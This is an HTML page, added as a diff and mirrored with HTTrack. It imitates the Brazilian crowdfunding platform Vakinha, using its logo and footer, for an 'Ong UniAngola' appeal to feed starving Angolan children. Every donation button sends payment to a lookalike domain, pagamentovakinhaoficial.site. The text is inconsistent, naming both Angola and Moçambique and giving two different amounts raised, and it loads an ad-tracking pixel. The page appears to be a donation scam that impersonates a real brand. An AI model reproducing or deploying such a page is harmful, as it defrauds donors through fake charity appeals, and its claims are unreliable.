@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from vakinha-angola.org/HS3MPCowMFlW by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Nov 2025 15:06:49 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="🙏 Juntos, podemos levar vida onde hoje só existe dor.💚 Clique agora e ajude a alimentar e salvar uma criança. 💚">
+    <meta name="keywords" content="vaquinha, doação, crowdfunding, ajuda, solidariedade">
+    <meta name="author" content="Angola">
+    <title>Ong UniAngola</title>
+    <meta property="og:title" content="Ong UniAngola">
+    <meta property="og:description" content="🙏 Juntos, podemos levar vida onde hoje só existe dor.💚 Clique agora e ajude a alimentar e salvar uma criança. 💚">
+    <meta property="og:image" content="images/og-image.html">
+    <meta property="og:url" content="/HS3MPCowMFlW">
+    <meta property="og:type" content="website">
+    <link rel="shortcut icon" href="https://www.vakinha.com.br/images/favicon.ico">
+    <link rel="icon" href="https://www.vakinha.com.br/images/favicon.ico" sizes="32x32">
+    <link rel="apple-touch-icon" href="https://www.vakinha.com.br/images/favicon.ico">
+    <link href="../cdn.jsdelivr.net/npm/bootstrap%405.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="../cdn.jsdelivr.net/npm/swiper%409.3.2/swiper-bundle.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&amp;display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --cor-primaria: #24CA68;
+            --cor-secundaria: #009D4E;
+            --bg-primario: #FFFFFF;
+            --bg-secundario: #F9F9F9;
+            --cor-texto: #282828;
+            --cor-texto-gray: #8A8A8A;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html, body {
+            font-family: 'Montserrat', sans-serif;
+            width: 100%;
+            min-height: 100vh;
+            background: var(--bg-secundario);
+            color: var(--cor-texto);
+            overflow-x: hidden;
+        }
+
+        a { text-decoration: none; transition: all 0.3s ease; }
+        img, video { max-width: 100%; height: auto; display: block; }
+
+        button, input, select, textarea { outline: none; transition: all 0.2s ease; cursor: pointer; }
+        button:focus, a:focus { outline: 2px solid var(--cor-primaria); outline-offset: 2px; }
+
+        .container { max-width: 1140px; padding: 0 15px; margin: 0 auto; }
+
+        header {
+            background: var(--bg-primario);
+            border-bottom: 2px solid #F1F0F0;
+            position: sticky; top: 0; z-index: 100;
+        }
+        .content-header { height: 80px; display: flex; align-items: center; justify-content: space-between; }
+        .logo svg { width: 125px; height: 32px; }
+
+        .menu-header { display: flex; align-items: center; gap: 16px; }
+        .item-menu { font-size: 16px; font-weight: 700; color: var(--cor-texto); display: flex; align-items: center; gap: 8px; cursor: pointer; }
+        .item-menu svg { fill: var(--cor-texto); width: 24px; height: 24px; }
+        .item-menu:hover, .item-menu:focus { opacity: 0.8; }
+        .item-menu-busca span, .item-menu-account { font-size: 14px; color: var(--cor-primaria); font-weight: 700; }
+        .item-menu-busca svg { fill: var(--cor-primaria); width: 24px; height: 24px; }
+
+        .btn-create-button {
+            background: var(--cor-primaria); color:#fff; padding: 8px 16px; border-radius: 8px;
+            font-size: 14px; font-weight: 700; border: none;
+        }
+        .btn-create-button:hover, .btn-create-button:focus { background: var(--cor-secundaria); }
+
+        button.menu-mobile { width: 32px; height: 32px; background: transparent; padding: 0; }
+        button.menu-mobile svg { width: 100%; height: 100%; fill: rgb(40, 40, 40); opacity: 0.8; }
+        .busca-mobile { padding-right: 16px; }
+        .busca-mobile svg { fill: var(--cor-primaria); width: 32px; height: 32px; }
+
+        #corpo { padding: 20px 0; }
+
+        .topVakinha { text-align: center; margin-bottom: 20px; }
+        .topVakinha span { font-size: 14px; text-transform: uppercase; color: #404040; }
+        .topVakinha h1 { font-size: 48px; color: #404040; margin: 5px 0; }
+        .topVakinha h1 + span { font-size: 18px; color: var(--cor-texto); }
+
+        .detailsVakinha { display: flex; flex-wrap: wrap; gap: 20px; }
+        .detalhes { flex: 2; min-width: 0; }
+        .resumo { flex: 1; min-width: 300px; }
+
+        .galeria { position: relative; overflow: hidden; border-radius: 8px; }
+        .swiper-slide { display: flex; justify-content: center; align-items: center; background:#000; }
+        .swiper-slide img, .swiper-slide video { width:100%; height:auto; object-fit: cover; }
+        .galeria video { width:100%; height:auto; max-height: 400px; }
+        .galeria .video-container { position: relative; }
+        .galeria .play-button {
+            position:absolute; top:50%; left:50%; transform:translate(-50%, -50%);
+            background: rgba(36,202,104,.7); border-radius: 50%; width: 60px; height: 60px;
+            display:flex; align-items:center; justify-content:center; cursor:pointer; animation:pulse 1.5s infinite; transition: all .3s;
+        }
+        .galeria .play-button svg { fill:#fff; width:30px; height:30px; }
+        .galeria .play-button:hover { background: rgba(36,202,104,1); }
+        @keyframes pulse { 0%{transform:translate(-50%,-50%) scale(1);opacity:1} 50%{transform:translate(-50%,-50%) scale(1.1);opacity:.8} 100%{transform:translate(-50%,-50%) scale(1);opacity:1} }
+
+        .galeria-pagination { position:absolute; bottom:15px; width:100%; text-align:center; }
+        .swiper-pagination-bullet { background:#fff; opacity:1; width:10px; height:10px; margin:0 4px; transition: all .3s; }
+        .swiper-pagination-bullet-active { background: var(--cor-primaria); }
+
+        .resumo-mobile { display:none; background: var(--bg-primario); padding:20px; position: sticky; top:80px; z-index:10; }
+        .progresso-mobile .barra { height:10px; background:#F1F0F0; border-radius:15px; overflow:hidden; }
+        .progresso-mobile .barraParcial { background: var(--cor-primaria); height:100%; border-radius:15px; transition: width .3s; }
+        .arrecadacaoMobile strong { font-size:22px; color: var(--cor-primaria); }
+
+        .sticker-resumo { background: var(--bg-primario); padding:16px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,.1); }
+        .barraTotal { height:10px; background:#F1F0F0; border-radius:15px; overflow:hidden; }
+        .barraParcial { background: var(--cor-primaria); height:100%; border-radius:15px; transition: width .3s; }
+        .arrecadado h2 { font-size:36px; color: var(--cor-primaria); margin:0; }
+
+        .btn-ajudar {
+            background: var(--cor-primaria); color:#fff; padding:12px; border-radius:8px;
+            font-size:20px; font-weight:700; width:100%; border:none; cursor:pointer; transition: background .3s;
+        }
+        .btn-ajudar:hover, .btn-ajudar:focus { background: var(--cor-secundaria); }
+
+        .perfil .avatar{ border:3px solid rgb(241,240,240); margin-right:5px; width:45px; height:45px; border-radius:50%; background:#c2c2c2; }
+        .perfil .avatar img{ width:100%; height:100%; border-radius:50%; object-fit: cover; }
+        .perfil .dadosPerfil{ width: calc(100% - 50px); }
+        .perfil .dadosPerfil h3{ display:flex; align-items:center; font-weight:700; font-size:14px; color:rgb(64,64,64); margin:0 0 4px; }
+        .perfil .dadosPerfil span.cidade{ font-size:12px; display:block; color:rgb(40,40,40); font-weight:400; line-height:16px; }
+        .perfil .dadosPerfil span.ativo{ font-size:12px; display:block; color:rgb(64,64,64); font-weight:700; line-height:16px; }
+        .perfil .dadosPerfil span.vakinhas{ display:flex; align-items:center; font-size:12px; font-weight:700; color:rgb(40,40,40); margin:3px 0 0; }
+        span.vakinhas .bullet{ margin:2px 5px 0; background:rgb(40,40,40); width:5px; height:5px; border-radius:50%; }
+        .perfil .dadosPerfil a{ font-size:10px; white-space:nowrap; text-decoration: underline !important; color:rgb(20,146,230); display:block; margin:6px 0 25px 4px; }
+
+        .dadosPerfil h3 { font-size:14px; margin:0; }
+
+        .hearts ul { display:flex; gap:8px; align-items:center; list-style:none; margin:10px 0; }
+        .hearts ul li img { width:32px; height:32px; border-radius:50%; }
+        .hearts .plus { font-size:16px; font-weight:700; color: var(--cor-texto); }
+        .heart-count { display:flex; align-items:center; gap:8px; font-size:14px; color: var(--cor-texto); }
+        .heart-count svg { width:16px; height:16px; }
+
+        .menu-detalhes ul { display:flex; gap:16px; border-bottom:2px solid #DFDFDF; margin-bottom:20px; list-style:none; }
+        .menu-detalhes li { padding:8px 0; font-size:18px; color:var(--cor-texto); cursor:pointer; transition: all .3s; }
+        .menu-detalhes li.active { color: var(--cor-primaria); border-bottom:2px solid var(--cor-primaria); font-weight:700; }
+
+        .show-sobre { background: var(--bg-primario); padding:25px; border-radius:8px; }
+        .show-sobre p { font-size:16px; line-height:1.5; }
+
+        /* ===== Comentários (plugin-facebook) ===== */
+        .plugin-facebook { margin-top: 24px; }
+        .facebook-comments .content-box{
+          background: var(--bg-primario);
+          border: 1px solid #F1F0F0;
+          border-radius: 12px;
+          padding: 16px;
+        }
+        .facebook-comments h4{
+          margin: 0 0 12px;
+          font-size: 16px;
+          font-weight: 700;
+          color: var(--cor-texto);
+        }
+        .comentario{ padding: 12px 0; border-top: 1px solid #EFEFEF; }
+        .comentario:first-child{ border-top: 0; }
+        .content-comentario{ display:flex; align-items:flex-start; gap:12px; }
+        .comentario .avatar{
+          width:40px; height:40px; border-radius:50%; overflow:hidden;
+          border:2px solid #F1F0F0; flex-shrink:0; background:#c2c2c2;
+        }
+        .comentario .avatar img{ width:100%; height:100%; object-fit: cover; }
+        .text-comentario h3{ margin:0 0 4px; font-size:14px; color: var(--cor-texto); font-weight:700; }
+        .text-comentario p{ margin:0 0 6px; font-size:14px; color: var(--cor-texto); line-height:1.5; }
+        .text-comentario .d-flex{ gap:12px; flex-wrap:wrap; }
+        .text-comentario .d-flex span{ font-size:12px; color: var(--cor-texto-gray); cursor:pointer; }
+        .text-comentario .d-flex span:hover{ color: var(--cor-primaria); }
+        .facebook-comments .final{ margin-top:8px; font-size:12px; color: var(--cor-texto-gray); }
+
+        /* ===== Modais ===== */
+        .modal { display:none; position:fixed; inset:0; background: rgba(0,0,0,.75); z-index:9999; align-items:center; justify-content:center; }
+        .modal-content {
+            background:#fff; max-width:600px; width:90%; padding:25px; border-radius:10px; position:relative; animation: fadeIn .3s ease;
+        }
+        @keyframes fadeIn { from{opacity:0; transform:scale(.9)} to{opacity:1; transform:scale(1)} }
+        .close-modal { position:absolute; top:10px; right:10px; font-size:20px; color:#6b7280; cursor:pointer; background:none; border:none; transition: color .3s; }
+        .close-modal:hover, .close-modal:focus { color: var(--cor-primaria); }
+        .fora-modal{ position:absolute; inset:0; }
+
+        /* ===== Botões de doação ===== */
+        .donation-options { margin-top:20px; }
+        .donation-option { width:100% !important; position:relative; }
+        .donation-link {
+            display:flex !important; align-items:center; justify-content:center;
+            width:100% !important; padding:12px 16px; border:2px solid var(--cor-primaria);
+            border-radius:8px; color: var(--cor-primaria); font-weight:600; text-align:center; min-height:50px;
+            transition: all .3s; background:#fff;
+        }
+        .donation-link:hover, .donation-link:focus, .donation-option.highlight .donation-link { background: var(--cor-primaria); color:#fff; }
+        .popular-badge{
+            position:absolute; top:-1.2rem; left:50%; transform:translateX(-50%);
+            background:#24CA68; color:#fff; font-size:.7rem; font-weight:700; padding:.15rem .35rem; border-radius:.25rem;
+            display:flex; align-items:center; gap:4px; white-space:nowrap; box-shadow:0 1px 3px rgba(0,0,0,.2);
+        }
+        .popular-badge svg{ width:12px; height:12px; fill:#fff; }
+
+        footer { background:#282828; color:#fff; margin-top:40px; position:relative; }
+        .aviso { background: var(--bg-secundario); padding:10px 0; text-align:center; font-size:12px; color: var(--cor-texto-gray); position:relative; z-index:1; }
+        .content-footer { padding:40px 0; display:grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap:20px; }
+        .sociais ul { display:flex; gap:16px; align-items:center; list-style:none; }
+        .sociais svg { fill:#fff; width:24px; height:24px; transition: opacity .3s; }
+        .sociais a:hover svg, .sociais a:focus svg { opacity:.8; }
+        .aba h4 { font-size:16px; color: var(--cor-secundaria); margin-bottom:12px; }
+        .aba ul { list-style:none; }
+        .aba ul li a { color:#fff; font-size:12px; transition: opacity .3s; }
+        .aba ul li a:hover, .aba ul li a:focus { opacity:.8; }
+        .copyright { background:#5A5A5A; padding:10px 0; text-align:center; font-size:12px; }
+
+        @media (max-width: 992px) {
+            .content-header { height: 60px; }
+            .menu-header { display: none; }
+            .menu-mobile { display: flex; }
+            .topVakinha h1 { font-size: 24px; }
+            .topVakinha h1 + span { font-size: 16px; }
+            .detalhes { flex: 1 0 100%; }
+            .resumo { display: none; }
+            .resumo-mobile { display: block; }
+            .modal-content { width: 95%; padding: 15px; }
+            .content-footer { grid-template-columns: 1fr; }
+            .galeria video { max-height: 300px; }
+        }
+
+        @media (max-width: 576px) {
+            .menu-detalhes li { font-size: 16px; }
+            .content-footer .aba { margin-bottom: 20px; }
+            .galeria video { max-height: 200px; }
+            .donation-option { flex: 0 0 100%; }
+        }
+
+            </style>
+
+    
+        <script>
+        window.pixelId = "68f95af16931dbe358a071c6";
+        (function(){let u=document.createElement('script');u.async=true;u.defer=true;u.src="../cdn.utmify.com.br/scripts/pixel/pixel.js";document.head.appendChild(u);})();
+    </script>
+    
+        
+    </head>
+<body>
+    <header>
+        <div class="container">
+            <div class="content-header">
+                <div class="logo">
+                    <a href="#" aria-label="Vakinha Home">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="125" height="32" fill="none" viewBox="0 0 151 40">
+                            <path fill="#24CA68" fill-rule="evenodd" d="M6.253 0h30.494a6.27 6.27 0 0 1 4.417 1.839A6.28 6.28 0 0 1 43 6.26V28.96q.001.148-.005.29V40l-8.12-4.775H6.253a6.27 6.27 0 0 1-4.416-1.84A6.28 6.28 0 0 1 0 28.964V6.263a6.28 6.28 0 0 1 1.837-4.421A6.27 6.27 0 0 1 6.253.002zm15.484 21.578q-.348 0-.692.046L15.3 11.647a3.97 3.97 0 0 0-2.732-5.986 3.956 3.956 0 0 0-4.246 2.262 3.97 3.97 0 0 0 1.065 4.697c.668.557 1.5.879 2.368.916l5.85 10.146a5.116 5.116 0 0 0 4.113 8.111 5.1 5.1 0 0 0 4.555-2.756 5.12 5.12 0 0 0-.368-5.317l5.87-10.178a3.96 3.96 0 0 0 3.692-3.085 3.97 3.97 0 0 0-2.003-4.376 3.955 3.955 0 0 0-4.744.784 3.97 3.97 0 0 0-.49 4.79l-5.754 9.976a5 5 0 0 0-.736-.058z" clip-rule="evenodd"></path>
+                        </svg>
+                    </a>
+                </div>
+
+                <nav class="menu-header">
+                    <div class="item-menu" aria-haspopup="true"><span>Como ajudar</span><svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                    <div class="item-menu" aria-haspopup="true"><span>Descubra</span><svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                    <div class="item-menu" aria-haspopup="true"><span>Como funciona</span><svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                    <div class="logArea">
+                        <div class="item-menu-busca"><span>Buscar</span><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34C6.37 3.53 3 6.68 3 10.5 3 14.09 5.91 17 9.5 17c2.03 0 3.94-.77 5.34-2.07l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14z"></path></svg></div>
+                        <div class="item-menu-account"><span>Minha conta</span></div>
+                        <button class="btn-create-button">Criar vaquinha</button>
+                    </div>
+                </nav>
+
+                <div class="menu-mobile d-flex d-lg-none d-xl-none align-items-center">
+                    <div class="busca-mobile">
+                        <svg width="24" height="24" viewBox="0 0 24 24">
+                            <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5
+                            3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0
+                            3.09-.59 4.23-1.57l.27.28v.79l5 4.99
+                            L20.49 19zm-6 0C7.01 14 5 11.99
+                            5 9.5S7.01 5 9.5 5 14 7.01 14
+                            9.5 11.99 14 9.5 14z"></path>
+                        </svg>
+                    </div>
+                </div>
+            </div><!-- /.content-header -->
+        </div><!-- /.container -->
+    </header>
+
+    <section id="corpo">
+        <div class="container">
+            <div class="topVakinha">
+                <span>SAÚDE / TRATAMENTOS</span>
+                <h1>Ong UniAngola</h1>
+                <span>ID: HS3MPCowMFlW</span>
+            </div>
+
+            <div class="detailsVakinha">
+                <div class="detalhes">
+                    <div class="detalhes-view">
+                        <div class="galeria swiper">
+                            <div class="swiper-wrapper">
+                                                                    <div class="swiper-slide">
+    <img src="capa.jpg" alt="Banner da campanha">
+</div>
+                                                            </div>
+                            <div class="galeria-pagination swiper-pagination"></div>
+                        </div>
+
+                        <div class="hearts">
+                            <ul>
+                                <li><img src="temporary/9GQr2F6CAz57/images/avs.svg" alt="Ícone"></li>
+                                <li><img src="temporary/9GQr2F6CAz57/images/perfil.png" alt="Perfil"></li>
+                                <li><img src="temporary/9GQr2F6CAz57/images/imm.svg" alt="Ícone"></li>
+                                <li><img src="temporary/9GQr2F6CAz57/images/lo.webp" alt="Ícone"></li>
+                                <li><img src="temporary/9GQr2F6CAz57/images/kc.webp" alt="Ícone"></li>
+                                <li><span class="plus">+</span></li>
+                            </ul>
+                            <div class="heart-count">
+                                <span><span id="coracoes">278</span> corações recebidos</span>
+                                <svg width="16" height="16" viewBox="0 0 18.319 15.34">
+                                    <path d="M9.16,2.184A5.647,5.647,0,0,0,3.174.242C.695,1.027-.329,3.754.092,6.165c.667,3.826,4.845,7.644,8.459,9.055a1.678,1.678,0,0,0,.6.12h.032a1.633,1.633,0,0,0,.59-.12c3.649-1.445,7.792-5.229,8.46-9.055a6.259,6.259,0,0,0,.091-1.012V5.048A4.864,4.864,0,0,0,15.145.242,5.119,5.119,0,0,0,13.6,0,5.855,5.855,0,0,0,9.16,2.184" fill="#24CA68"></path>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="resumo-mobile">
+                        <div class="perfil">
+                            <div class="avatar"><img src="temporary/9GQr2F6CAz57/images/perfil.png" alt="Angola"></div>
+                            <div class="dadosPerfil">
+                                <h3></h3>
+                                <span class="ativo">Ativo(a) no Vakinha desde 23/10/2025</span>
+                                <span class="vakinhas">12 vaquinhas criadas <span class="bullet"></span> 1 vaquinha apoiada</span>
+                            </div>
+                        </div>
+                        <div class="progresso-mobile">
+                            <span class="porcentagem">39.48%</span>
+                            <div class="barra"><div class="barraParcial" style="width:39.48%;"></div></div>
+                        </div>
+                        <div class="arrecadacaoMobile">
+                            <strong>R$ 1.512,63</strong> de <span>R$ 4.500,00</span>
+                        </div>
+                    </div>
+
+                    <nav class="menu-detalhes">
+                        <ul>
+                            <li class="active" data-tab="sobre">Sobre</li>
+                            <li data-tab="novidades">Novidades</li>
+                            <li data-tab="quem-ajudou">Quem ajudou</li>
+                        </ul>
+                    </nav>
+
+                    <div class="show-sobre tabcontent" id="sobre">
+                                                    <span class="inicio"><strong>Vaquinha criada em:</strong> 23/10/2025</span>
+                                                <div><h3 class="ql-align-center">A Realidade em Angola:</h3><h3 class="ql-align-center">Enquanto você lê este texto, milhares de crianças em Angola enfrentam uma dor que não se pode descrever. Elas estão com fome, doentes, enfraquecidas, e muitas delas mal conseguem levantar da cama. A desnutrição grave, a falta de alimentos, de medicamentos e de tratamentos básicos está tirando a vida de inocentes todos os dias.</h3><h3 class="ql-align-center"><br></h3><h3 class="ql-align-center">Algumas dessas crianças têm apenas a pele e os ossos, choram por comida que não chega, ou lutam contra infecções graves sem nenhum tipo de medicamento ou curativo. É uma dor silenciosa, longe das câmeras, mas que não pode mais ser ignorada.</h3><h3 class="ql-align-center"><br></h3><h3 class="ql-align-center">Tudo que for arrecadado será utilizado diretamente para salvar vidas:</h3><h3 class="ql-align-center"><br></h3><h3 class="ql-align-center">🍛 Compra de alimentos nutritivos para combater a desnutrição;</h3><h3 class="ql-align-center">💊 Medicamentos essenciais para tratar infecções e febres;</h3><h3 class="ql-align-center">🩹 Curativos e materiais hospitalares para crianças feridas e acamadas;</h3><h3 class="ql-align-center">🏥 Transporte e tratamento médico para os casos mais urgentes.</h3><h3 class="ql-align-center"><br></h3><h3 class="ql-align-center"><strong>Como Você Pode Ajudar?</strong></h3><h3 class="ql-align-center">Cada real doado se transforma em esperança.</h3><h3 class="ql-align-center">👉 Clique no botão verde abaixo e escolha o valor da sua contribuição.</h3><h3 class="ql-align-center">A plataforma é segura e toda ajuda será destinada às equipes que estão atuando diretamente com as crianças em Moçambique.</h3><h3 class="ql-align-center"><br></h3><h3 class="ql-align-center">Nosso Agradecimento</h3><h3 class="ql-align-center">Mesmo a quilômetros de distância, sua compaixão pode alcançar o coração de uma criança faminta. Cada doação, cada compartilhamento, cada oração — tudo conta.</h3><h3 class="ql-align-center"><br></h3><h3 class="ql-align-center">🙏 Juntos, podemos levar vida onde hoje só existe dor.</h3><h3 class="ql-align-center">💚 Clique agora e ajude a alimentar e salvar uma criança. 💚</h3><p><br></p></div>
+                        <button class="btn-ajudar" onclick="openDonateModal()">Quero Ajudar</button>
+                    </div>
+
+                    <div class="tabcontent" id="novidades" style="display:none;">
+                        <p>Novidades em breve!</p>
+                    </div>
+
+                    <div class="tabcontent" id="quem-ajudou" style="display:none;">
+                        <p>Lista de apoiadores em breve!</p>
+                    </div>
+
+                                    </div>
+
+                <div class="resumo">
+                    <div class="sticker-resumo">
+                        <div class="progresso">
+                            <div class="barraTotal"><div class="barraParcial" style="width:39.48%;"></div></div>
+                        </div>
+                        <div class="arrecadado">
+                            <span>Arrecadado</span>
+                            <h2>R$ 1.392,12</h2>
+                        </div>
+                        <div class="meta">
+                            <span>Meta</span>
+                            <span>R$ 4.500,00</span>
+                        </div>
+                        <div class="apoiadores">
+                            <span>Apoiadores</span>
+                            <span>231</span>
+                        </div>
+                        <div class="acao">
+                            <button class="btn-ajudar" onclick="openDonateModal()">Quero Ajudar</button>
+                        </div>
+                        <div class="perfil">
+                            <div class="avatar"><img src="images/perfil.jpg" alt="Angola"></div>
+                            <div class="dadosPerfil">
+                                <h3>Angola</h3>
+                                <span class="ativo">Ativo(a) no Vakinha desde 12/11/2025</span>
+                                <span class="vakinhas">12 vaquinhas criadas <span class="bullet"></span> 3 vaquinhas apoiadas</span>
+                                <a href="#">Leia mais</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div><!-- /.detailsVakinha -->
+        </div><!-- /.container -->
+    </section>
+
+    <!-- CTA fixa (mobile) -->
+    <section id="fixed-mobile" class="d-block d-lg-none d-xl-none" style="position:fixed; bottom:0; left:0; right:0; padding:1rem; background:#fff; box-shadow:0 -2px 6px rgba(0,0,0,0.1);">
+        <button type="button" class="btn-ajudar w-100" style="background-color:#24CA68!important;" onclick="openDonateModal()">
+            Ajudar Angola Agora
+        </button>
+    </section>
+
+    <footer>
+        <div class="aviso">
+            <div class="container">
+                <span>AVISO LEGAL: O texto e as imagens incluídos nessa página são de única e exclusiva responsabilidade do criador da vaquinha e não representam a opinião ou endosso da plataforma Vakinha.</span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="content-footer">
+                <div class="aba">
+                    <div class="logo-rodape">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="125" height="32" fill="none" viewBox="0 0 151 40">
+                            <path fill="#24CA68" fill-rule="evenodd" d="M6.253 0h30.494a6.27 6.27 0 0 1 4.417 1.839A6.28 6.28 0 0 1 43 6.26V28.96q.001.148-.005.29V40l-8.12-4.775H6.253a6.27 6.27 0 0 1-4.416-1.84A6.28 6.28 0 0 1 0 28.964V6.263a6.28 6.28 0 0 1 1.837-4.421A6.27 6.27 0 0 1 6.253.002zm15.484 21.578q-.348 0-.692.046L15.3 11.647a3.97 3.97 0 0 0-2.732-5.986 3.956 3.956 0 0 0-4.246 2.262 3.97 3.97 0 0 0 1.065 4.697c.668.557 1.5.879 2.368.916l5.85 10.146a5.116 5.116 0 0 0 4.113 8.111 5.1 5.1 0 0 0 4.555-2.756 5.12 5.12 0 0 0-.368-5.317l5.87-10.178a3.96 3.96 0 0 0 3.692-3.085 3.97 3.97 0 0 0-2.003-4.376 3.955 3.955 0 0 0-4.744.784 3.97 3.97 0 0 0-.49 4.79l-5.754 9.976a5 5 0 0 0-.736-.058z" clip-rule="evenodd"></path>
+                        </svg>
+                    </div>
+                </div>
+                <div class="aba">
+                    <h4>Links rápidos</h4>
+                    <ul>
+                        <li><a href="#">Quem somos</a></li>
+                        <li><a href="#">Vaquinhas</a></li>
+                        <li><a href="#">Criar vaquinhas</a></li>
+                        <li><a href="#">Login</a></li>
+                        <li><a href="#">Vaquinhas mais amadas</a></li>
+                        <li><a href="#">Política de privacidade</a></li>
+                        <li><a href="#">Termos de uso</a></li>
+                    </ul>
+                </div>
+                <div class="aba">
+                    <h4>Suporte</h4>
+                    <ul>
+                        <li><a href="#">Dúvidas frequentes</a></li>
+                        <li><a href="#">Taxas e prazos</a></li>
+                        <li><a href="#">Loja de corações</a></li>
+                        <li><a href="#">Vakinha Premiada</a></li>
+                        <li><a href="#">Blog do Vakinha</a></li>
+                        <li><a href="#">Segurança e transparência</a></li>
+                        <li><a href="#">Busca por recibo</a></li>
+                    </ul>
+                </div>
+                <div class="aba">
+                    <h4>Fale conosco</h4>
+                    <ul>
+                        <li><a href="https://www.vakinha.com.br/fale-conosco">Clique aqui para falar conosco</a></li>
+                        <li>De Segunda à Sexta</li>
+                        <li>Das 9:30 às 17:00</li>
+                        <li><img src="temporary/9GQr2F6CAz57/images/selo_seguranca.webp" alt="Selo de Segurança"></li>
+                    </ul>
+                </div>
+                <div class="aba">
+                    <h4>Baixe nosso App</h4>
+                    <ul>
+                        <li><a href="#"><img src="temporary/9GQr2F6CAz57/images/google_play.svg" alt="Google Play"></a></li>
+                        <li><a href="#"><img src="temporary/9GQr2F6CAz57/images/apple_store.svg" alt="Apple Store"></a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="copyright">
+            <span>© 2025 - Todos direitos reservados</span>
+        </div>
+    </footer>
+
+    <!-- Modal: Doar -->
+    <div class="modal" id="donateModal" aria-hidden="true">
+        <div class="fora-modal" onclick="closeDonateModal()"></div>
+        <div class="modal-content" tabindex="-1" role="dialog" aria-modal="true" aria-label="Doar">
+            <button class="close-modal" onclick="closeDonateModal()" aria-label="Fechar">×</button>
+            <div class="text-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="125" height="32" fill="none" viewBox="0 0 151 40">
+                    <path fill="#24CA68" fill-rule="evenodd" d="M6.253 0h30.494a6.27 6.27 0 0 1 4.417 1.839A6.28 6.28 0 0 1 43 6.26V28.96q.001.148-.005.29V40l-8.12-4.775H6.253a6.27 6.27 0 0 1-4.416-1.84A6.28 6.28 0 0 1 0 28.964V6.263a6.28 6.28 0 0 1 1.837-4.421A6.27 6.27 0 0 1 6.253.002zm15.484 21.578q-.348 0-.692.046L15.3 11.647a3.97 3.97 0 0 0-2.732-5.986 3.956 3.956 0 0 0-4.246 2.262 3.97 3.97 0 0 0 1.065 4.697c.668.557 1.5.879 2.368.916l5.85 10.146a5.116 5.116 0 0 0 4.113 8.111 5.1 5.1 0 0 0 4.555-2.756 5.12 5.12 0 0 0-.368-5.317l5.87-10.178a3.96 3.96 0 0 0 3.692-3.085 3.97 3.97 0 0 0-2.003-4.376 3.955 3.955 0 0 0-4.744.784 3.97 3.97 0 0 0-.49 4.79l-5.754 9.976a5 5 0 0 0-.736-.058z" clip-rule="evenodd"></path>
+                </svg>
+                <h3>Ong UniAngola</h3>
+                <p>🙏 Juntos, podemos levar vida onde hoje só existe dor.💚 Clique agora e ajude a alimentar e salvar uma criança. 💚</p>
+            </div>
+
+            <div class="donation-options row">
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=25" class="donation-link" target="_blank" rel="noopener">
+                            R$ 25,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=30" class="donation-link" target="_blank" rel="noopener">
+                            R$ 30,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=40" class="donation-link" target="_blank" rel="noopener">
+                            R$ 40,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=50" class="donation-link" target="_blank" rel="noopener">
+                            R$ 50,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=60" class="donation-link" target="_blank" rel="noopener">
+                            R$ 60,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=80" class="donation-link" target="_blank" rel="noopener">
+                            R$ 80,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=100" class="donation-link" target="_blank" rel="noopener">
+                            R$ 100,00                        </a>
+                    </div>
+                </div>
